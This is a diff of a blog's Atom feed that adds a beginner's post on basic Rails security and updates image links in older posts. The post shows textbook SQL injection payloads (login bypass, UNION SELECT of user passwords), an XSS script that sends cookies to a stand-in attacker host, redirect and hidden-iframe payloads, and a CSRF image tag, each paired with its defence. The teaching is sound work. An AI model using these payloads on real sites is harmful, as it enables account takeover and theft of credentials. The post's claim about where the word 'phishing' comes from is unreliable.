@@ -4,7 +4,7 @@
   <title><![CDATA[H.E.L.M.]]></title>
   <link href="http://desmondrawls.github.io/feed" rel="self"/>
   <link href="http://desmondrawls.github.io/"/>
-  <updated>2013-06-24T09:18:05-04:00</updated>
+  <updated>2013-09-12T03:00:32-04:00</updated>
   <id>http://desmondrawls.github.io/</id>
   <author>
     <name><![CDATA[Desmond Rawls]]></name>
@@ -12,6 +12,307 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Basic Rails Security]]></title>
+    <link href="http://desmondrawls.github.io/blog/2013/09/12/basic-rails-security/"/>
+    <updated>2013-09-12T02:20:00-04:00</updated>
+    <id>http://desmondrawls.github.io/blog/2013/09/12/basic-rails-security</id>
+    <content type="html"><![CDATA[<p>Recording on version control from the octocat animal shelter aka the hackathon of life aka the conference room that looks a lot like a bar aka the xss justice league aka the no-sql-no-cry school aka the pull-request-of-destiny school aka the ask-me-about-blocks-procs-and-lambdas school aka the Flatiron School in purgatory</p>
+
+<p>Now that I have some idea how to control my tables and views my next big task is to make sure no one else gets any ideas about how to control my tables and views. Security is for lovers. I love my databases and I love my users and I don&rsquo;t want any sql injection or cross-site scripting getting between us.</p>
+
+<h3>The SQL Hamburgler</h3>
+
+<p>Sql injection is the hostile practice of using sql fragments in form inputs to manipulate the database queries that will happen when processing that form. In Pleasantville form inputs supply only values to sql statements. In Crooklyn inputs are fragments of sql statements that will be processed as part of the database query. The corrupt database queries will perform actions that suit your attacker&rsquo;s interests more than yours. Sql injection attacks usually have one of two objectives:</p>
+
+<ol>
+<li>Bypassing Authorization</li>
+</ol>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Example:   
+</span><span class='line'>    
+</span><span class='line'>      An attacker entering   ' OR '1'='1   in the name field and   ' OR '1'='1  
+</span><span class='line'>      in the password field results in the sql statement:
+</span><span class='line'>    
+</span><span class='line'>      SELECT * FROM users WHERE login = ''  
+</span><span class='line'>      OR '1'='1'  
+</span><span class='line'>      AND password = ''  
+</span><span class='line'>      OR '2'>'1' LIMIT 1
+</span><span class='line'>
+</span><span class='line'>      This statement will always set the session's current_user to the first user  
+</span><span class='line'>      in the table. The attacker is now logged in as that user whether or not the  
+</span><span class='line'>      attacker is even a casual acquaintance of theirs.</span></code></pre></td></tr></table></div></figure>
+
+
+<ol>
+<li>Unauthorized Reading</li>
+</ol>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Example:
+</span><span class='line'>    
+</span><span class='line'>      Given the query  
+</span><span class='line'>      Project.where("name = '#{params[:name]}'")  
+</span><span class='line'>      an attacker entering  
+</span><span class='line'>      ') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --  
+</span><span class='line'>      in the name field results in the sql statement:
+</span><span class='line'>    
+</span><span class='line'>      SELECT * FROM projects WHERE (name = '') UNION
+</span><span class='line'>      SELECT id,login AS name,password AS description,1,1,1 FROM users --' 
+</span><span class='line'>    
+</span><span class='line'>      If the number of columns in both queries matches then then this statement  
+</span><span class='line'>      will return a list of all user names and passwords.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Defense Against the Dark Arts</p>
+
+<p>The counter-spell to SQL injection is to handle the database query plan and the values separately. As of Rails 3.1 ActiveRecord enables prepared statements in database queries. A prepared statement looks like:</p>
+
+<pre><code>SELECT "people".* FROM "people" WHERE "people"."id" = ? LIMIT 1  [["id", 1]]
+</code></pre>
+
+<p>For higher-level commands like :new and :find ActiveRecord takes care of the formatting. For lower-level commands like :where and :select you have to do it yourself. Both of these result in prepared statements:</p>
+
+<pre><code>Person.where("user_name = ? AND password = ?", user_name, password).first
+
+Person.new(name: "Spider Jerusalem")
+</code></pre>
+
+<p>Before prepared statements ActiveRecord took four steps to execute a database query:</p>
+
+<ol>
+<li>Parse SQL statement</li>
+<li>Come up with query plan</li>
+<li>Execute query plan</li>
+<li>Return results</li>
+</ol>
+
+
+<p>Without prepared statements the query plan depends on parsing the SQL statement, user input and all. This way SQL fragments in values can affect the query plan.</p>
+
+<p>With prepared statements the database comes up with a query plan and caches it before we send any values. We then send the values along with a token for the cached sequel statement. With the statement already cached(meaning after the first query) the database only needs to perform 2 steps:</p>
+
+<ol>
+<li>Execute the query plan</li>
+<li>Return results</li>
+</ol>
+
+
+<p>This way the values have no affect on the query plan. If an attacker inputs some SQL craziness ActiveRecord will only wind up searching the corresponding column for a row containing that SQL craziness. No harm done.</p>
+
+<p>Efficiency side-note: on SQlite3 and Postgres caching prepared statements means dramatically more efficient database queries. The effect is greater with more complex queries because the query planning step takes longer. On mySQL, however, prepared statements are actually less efficient for simple queries because there is no separate step for query planning in these simple cases. mySQL does still follow the general trend for more complex queries.</p>
+
+<h3>Mass-assignment</h3>
+
+<p>Mass-assignment is a convenient way of processing all the params of a form at once. The vulnerability is that params you don&rsquo;t want to assign can be sent to your controller. For example, with the http request:</p>
+
+<pre><code>PUT http://massassignment.com/users/1?user[can_edit_anything]=true
+</code></pre>
+
+<p>We don&rsquo;t want to assign can_edit_anything without deliberation. By listing attributes under attr-accessible in the model we tell ActiveRecord which attributes it can mass-assign. These should be the benign attributes. Attributes like can_edit_anything have no place on that list.</p>
+
+<pre><code>class User &lt; ActiveRecord::Base
+  attr_accessible :firstname, :lastname
+end
+</code></pre>
+
+<p>We can also customize the list for different roles:</p>
+
+<pre><code>class User &lt; ActiveRecord::Base
+  attr_accessible :firstname, :lastname
+  attr_accessible :can_edit_anything, :as =&gt; :admin
+end
+</code></pre>
+
+<p>The attributes that are listed as accessible will still be protected from meddling as long as your controller is doing it&rsquo;s job. The controller should be checking that you are logged in as the current user before changing the current user&rsquo;s attributes. So you can change your name as many times as you want but no one else can.</p>
+
+<h3>Cross-Site Scripting Attacks</h3>
+
+<p>Cross-site Scripting While SQL injection is a server-side attack, Cross-site Scripting is a client-side attack. In this case, attackers are taking advantage of their input being rendered with the DOM to change the functionality of the page. Cross-site Scripting attacks usually have one of these objectives:</p>
+
+<ol>
+<li>Stealing the cookie to hijack the session</li>
+</ol>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Example:
+</span><span class='line'>    
+</span><span class='line'>    An attacker enters 
+</span><span class='line'>    
+</span><span class='line'>      &lt;script>document.write('&lt;img src="http://www.cookiemonster.com/' + document.cookie + '">');&lt;/script> 
+</span><span class='line'>    
+</span><span class='line'>    in a field that is unceremoniously dumped into the DOM. The  
+</span><span class='line'>    resulting http request to attacker.com will the cookie information  
+</span><span class='line'>    included in the request.
+</span><span class='line'>    
+</span><span class='line'>    The attacker can then check the logs for www.cookiemonster.com and see
+</span><span class='line'>    
+</span><span class='line'>      GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2</span></code></pre></td></tr></table></div></figure>
+
+
+<ol>
+<li>Redirecting to a fake website</li>
+</ol>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Example:
+</span><span class='line'>    
+</span><span class='line'>    An attacker enters
+</span><span class='line'>    
+</span><span class='line'>      ">&lt;script>document.location='http://yoursoulismine.com';&lt;/script>
+</span><span class='line'>    
+</span><span class='line'>    in a field that is unceremoniously dumped into the DOM. 
+</span><span class='line'>    
+</span><span class='line'>    The page will then redirect to the attacker's url. An attacker might use this  
+</span><span class='line'>     traffic to get more twitter followers, or they might use a phishing site  
+</span><span class='line'>     that imitates the previous page to coax the user into giving  
+</span><span class='line'>     them sensitive information. 
+</span><span class='line'>    
+</span><span class='line'>    Historical side-note: The term "phishing" comes from &lt;>&lt;,  
+</span><span class='line'>    a common html tag in chat transcripts that attackers exploited  
+</span><span class='line'>    in the earliest of such scams.</span></code></pre></td></tr></table></div></figure>
+
+
+<ol>
+<li>Defacement</li>
+</ol>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Example:
+</span><span class='line'>    
+</span><span class='line'>    An attacker enters
+</span><span class='line'>    
+</span><span class='line'>      &lt;iframe name=”StatPage” src="http://58.xx.xxx.xxx" width=5 height=5 style=”display:none”>&lt;/iframe>
+</span><span class='line'>    
+</span><span class='line'>    in a field that is unceremoniously dumped into the DOM.
+</span><span class='line'>    
+</span><span class='line'>    Similar to the redirect example, an attacker could open an  
+</span><span class='line'>    iframe that impersonates a part of the original site.  
+</span><span class='line'>    Here the goal might be to display advertisements or, as before,  
+</span><span class='line'>    to coax the user into supplying sensitive information.</span></code></pre></td></tr></table></div></figure>
+
+
+<ol>
+<li><p>Installing malicious software through security holes in the web browser.</p>
+
+<p> See &ldquo;Samy&rdquo;: <a href="http://en.wikipedia.org/wiki/Samy_">http://en.wikipedia.org/wiki/Samy_</a>(computer_worm)</p></li>
+</ol>
+
+
+<p>Defense against the dark arts:</p>
+
+<p>To defend against cookie-stealers we can include httpOnly in the HTTP response header. httpOnly is a flag that can be set on a cookie. This flag makes it so the cookie can only be sent in http requests and it cannot be accessed by client-side script. This defense is effective against ordinary javascript injection but is still vunerable to asynchronous scripts.</p>
+
+<p>Popularity side-note: In 2011 this <a href="http://w2spconf.com/2010/papers/p25.pdf">Report</a> found that just over half the top 50 sites do not use httpOnly and as a result are vulnerable to cookie-stealing xss attacks. As of version 2.3.2 Rails was the only open source framework to set the HTTP-only flag by default. Minswan.</p>
+
+<p>The best defense against xss is old-fashioned santizing of user input. Whitelisting is better than blacklisting. With a blacklist, if you are only filtering the input once then an attacker might anticipate your filter by burying their malicious code in the second layer of their input. For example, <scrscriptipt>, after filtering out &lsquo;script&rsquo;, will still read &lsquo;script&rsquo;. So only accept the good input don&rsquo;t try to filter the bad.</p>
+
+<h3>Cross-Site Request Forgeries</h3>
+
+<p>Cross-site Request Forgeries are like Cross-site Scripting attacks in that they are client-side attacks. In this case, however, the attacker exploits the possibility of the user being logged in on another site. If they are logged in the attack sends a malicious http request to that site.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Example:
+</span><span class='line'>    
+</span><span class='line'>    An attacker posts
+</span><span class='line'>    
+</span><span class='line'>      &lt;img src="http://bank.com/account/1/destroy" />
+</span><span class='line'>
+</span><span class='line'>so that when a user loads the page with that img tag the  
+</span><span class='line'>http request is sent to look for an img. If the user is still  
+</span><span class='line'>logged in to bank.com then the  request will go through and quietly  
+</span><span class='line'>do the attacker's bidding.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Defense against the dark arts:</p>
+
+<p>Being careful about seperating GET and POST helps with the most basic attacks. Rails just about forces good behavior on this front so no GET request should be executing business logic. There is, however, still the case of when an attacker tricks a user into submitting a form with dangerous hidden values.</p>
+
+<p>The <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF">Synchronizer Token Pattern</a>_Prevention_Cheat_Sheet) calls for embedding a random, unique token in all forms for a given session. The controller action can then check the token to verify that the HTTP request came from an authorized form.</p>
+
+<h3>Conclusion</h3>
+
+<p>Prepared statements, attr-accessible, httpOnly, and restful controller actions are very simple ways of protecting yourself. The Synchronizer Token Pattern takes a little more work but sounds straight-forward. Not having experience with security, I imagine most of the time spent locking down a site goes into sanitizing user input with whitelists and regExp. If you want to survive you can&rsquo;t trust anyone with a keyboard or a touch-screen or a magic mouse or a wiimote.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Student Driver]]></title>
@@ -23,7 +324,7 @@
 <br><br><br>
 
 
-<div style="float: right; padding-left: 40px"><img src="../images/mr2.jpg" alt="mr2" width="300" display="inline"></div>
+<div style="float: right; padding-left: 40px"><img src="http://desmondrawls.github.io/images/mr2.jpg" alt="mr2" width="300" display="inline"></div>
 
 
 <p>I learned to drive on a stick shift. My first car was a red two-seat &lsquo;91 Toyota mr2 kinda like this here. My dad copped it for a quick 3k. He later sold it after I failed to communicate that it was the only vehicle I could ever love.</p>
@@ -41,7 +342,7 @@
 <br><br>
 
 
-<p><img src="../images/playlister_erb_diagram.jpg" alt="playlister" height="300" width="1000" display="inline"></p>
+<p><img src="http://desmondrawls.github.io/images/playlister_erb_diagram.jpg" alt="playlister" height="300" width="1000" display="inline"></p>
 
 <p>RIP. Tomorrow we start on Sinatra. I browsed some Sinatra apps on github to try to see how they work. The simplest example I could find is this blogging app called &ldquo;(<a href="https://github.com/adamwiggins/scanty" title="Scanty">Scanty</a>), a really small blog.&rdquo; I tried drawing a diagram of this one too:</p>
 
@@ -103,11 +404,11 @@
 <br><br>  
 
 
-<p><img src="../images/yieldcode1.jpg" alt="code" height="300" width="1000" display="inline"></p>
+<p><img src="http://desmondrawls.github.io/images/yieldcode1.jpg" alt="code" height="300" width="1000" display="inline"></p>
 
-<p><img src="../images/yieldcode2.jpg" alt="code" height="300" width="1000" display="inline"></p>
+<p><img src="http://desmondrawls.github.io/images/yieldcode2.jpg" alt="code" height="300" width="1000" display="inline"></p>
 
-<p><img src="../images/yieldcode3.jpg" alt="code" height="300" width="1000" display="inline"></p>
+<p><img src="http://desmondrawls.github.io/images/yieldcode3.jpg" alt="code" height="300" width="1000" display="inline"></p>
 
 <br><br><br>
 
@@ -118,11 +419,11 @@ With a method that takes an argument:</p>
 <br><br><br>
 
 
-<p><img src="../images/yieldcode4.jpg" alt="code" height="300" width="1000" display="inline"></p>
+<p><img src="http://desmondrawls.github.io/images/yieldcode4.jpg" alt="code" height="300" width="1000" display="inline"></p>
 
-<p><img src="../images/yieldcode6.jpg" alt="code" height="300" width="1000" display="inline"></p>
+<p><img src="http://desmondrawls.github.io/images/yieldcode6.jpg" alt="code" height="300" width="1000" display="inline"></p>
 
-<p><img src="../images/yieldcode7.jpg" alt="code" height="300" width="1000" display="inline"></p>
+<p><img src="http://desmondrawls.github.io/images/yieldcode7.jpg" alt="code" height="300" width="1000" display="inline"></p>
 
 <br><br><br>
 
@@ -132,9 +433,9 @@ With a method that takes an argument:</p>
 <br><br><br>
 
 
-<p><img src="../images/yieldcode8.jpg" alt="code" height="300" width="1000" display="inline"></p>
+<p><img src="http://desmondrawls.github.io/images/yieldcode8.jpg" alt="code" height="300" width="1000" display="inline"></p>
 
-<p><img src="../images/yieldcode9.jpg" alt="code" height="300" width="1000" display="inline"></p>
+<p><img src="http://desmondrawls.github.io/images/yieldcode9.jpg" alt="code" height="300" width="1000" display="inline"></p>
 
 <br><br><br>
 
@@ -144,9 +445,9 @@ With a method that takes an argument:</p>
 <br><br><br>
 
 
-<p><img src="../images/yieldcode10.jpg" alt="code" height="300" width="1000" display="inline"></p>
+<p><img src="http://desmondrawls.github.io/images/yieldcode10.jpg" alt="code" height="300" width="1000" display="inline"></p>
 
-<p><img src="../images/yieldcode11.jpg" alt="code" height="300" width="1000" display="inline"></p>
+<p><img src="http://desmondrawls.github.io/images/yieldcode11.jpg" alt="code" height="300" width="1000" display="inline"></p>
 
 <br><br><br>
 
@@ -156,13 +457,13 @@ With a method that takes an argument:</p>
 <br><br><br>
 
 
-<p><img src="../images/yieldcode12.jpg" alt="code" height="300" width="1000" display="inline"></p>
+<p><img src="http://desmondrawls.github.io/images/yieldcode12.jpg" alt="code" height="300" width="1000" display="inline"></p>
 
-<p><img src="../images/yieldcode13.jpg" alt="code" height="300" width="1000" display="inline"></p>
+<p><img src="http://desmondrawls.github.io/images/yieldcode13.jpg" alt="code" height="300" width="1000" display="inline"></p>
 
-<p><img src="../images/yieldcode14.jpg" alt="code" height="300" width="1000" display="inline"></p>
+<p><img src="http://desmondrawls.github.io/images/yieldcode14.jpg" alt="code" height="300" width="1000" display="inline"></p>
 
-<p><img src="../images/yieldcode15.jpg" alt="code" height="300" width="1000" display="inline"></p>
+<p><img src="http://desmondrawls.github.io/images/yieldcode15.jpg" alt="code" height="300" width="1000" display="inline"></p>
 
 <br><br><br>
 
@@ -171,26 +472,26 @@ With a method that takes an argument:</p>
 
 <h3>1. &lsquo;yield&rsquo; is the settings on your microwave. Like on mine i have &ldquo;time defrost&rdquo;, &ldquo;auto defrost&rdquo;, &ldquo;reheat&rdquo;, &ldquo;cook&rdquo;, &ldquo;popcorn&rdquo;, &ldquo;pizza&rdquo;, and &ldquo;beverage.&rdquo;</h3>
 
-<p><img src="../images/popcorn.jpg" alt="Smiley face" height="200" width="400" display="inline"></p>
+<p><img src="http://desmondrawls.github.io/images/popcorn.jpg" alt="Smiley face" height="200" width="400" display="inline"></p>
 
 <h3>2. &lsquo;yield&rsquo; is the attachments on your kitchenaid food processor.</h3>
 
-<p><img src="../images/mixer.jpg" alt="Smiley face" height="400" width="400" display="inline"></p>
+<p><img src="http://desmondrawls.github.io/images/mixer.jpg" alt="Smiley face" height="400" width="400" display="inline"></p>
 
 <h3>3. &lsquo;yield&rsquo; is AutoTune.</h3>
 
-<p><audio src="../audio/chipmunk.m4a" controls><a href="../audio/vader.m4v">an audio</a></audio></p>
+<p><audio src="http://desmondrawls.github.io/audio/chipmunk.m4a" controls><a href="../audio/vader.m4v">an audio</a></audio></p>
 
-<p><audio src="../audio/vader.m4a" controls><a href="../audio/vader.m4v">an audio</a></audio></p>
+<p><audio src="http://desmondrawls.github.io/audio/vader.m4a" controls><a href="../audio/vader.m4v">an audio</a></audio></p>
 
 <h3>4. &lsquo;yield&rsquo; is tinted sunglasses.</h3>
 
-<p><img src="../images/bono.jpg" alt="Smiley face" height="200" width="400" display="inline"><img src="../images/bonoblue.jpg" alt="Smiley face" height="200" width="400" display="inline"></P>
+<p><img src="http://desmondrawls.github.io/images/bono.jpg" alt="Smiley face" height="200" width="400" display="inline"><img src="http://desmondrawls.github.io/images/bonoblue.jpg" alt="Smiley face" height="200" width="400" display="inline"></P>
 
 
 <h3>5. &lsquo;yield&rsquo; is that trick play from Little Giants.</h3>
 
-<p><video src="../images/little_giants.mp4" controls><a href="../images/little_giants.mp4">a film</a></video></p>
+<p><video src="http://desmondrawls.github.io/images/little_giants.mp4" controls><a href="http://desmondrawls.github.io/images/little_giants.mp4">a film</a></video></p>
 
 <br><br><br><br><br><br><br><br>
 
